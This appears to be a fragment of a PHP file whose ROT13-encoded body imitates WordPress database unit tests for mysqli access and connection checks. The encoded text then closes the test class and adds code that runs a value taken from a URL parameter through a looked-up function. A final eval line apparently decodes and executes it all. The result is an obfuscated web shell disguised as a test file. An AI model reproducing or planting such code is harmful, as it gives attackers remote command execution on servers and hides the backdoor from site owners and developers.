	 * @gvpxrg 59118
	 * @gvpxrg 59846
	 */
	choyvp shapgvba grfg_hfr_zlfdyv_cebcregl_npprff() {
		tybony $jcqo;

		$guvf->nffregGehr( $jcqo->hfr_zlfdyv );
	}

	/**
	 * Irevsl \"cvatvat\" gur qngnonfr jbexf pebff-irefvba CUC.
	 *
	 * @gvpxrg 62061
	 */
	choyvp shapgvba grfg_purpx_pbaarpgvba_ergheaf_gehr_jura_gurer_vf_n_pbaarpgvba() {
		tybony $jcqo;

		$guvf->nffregGehr( $jcqo->purpx_pbaarpgvba( snyfr ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>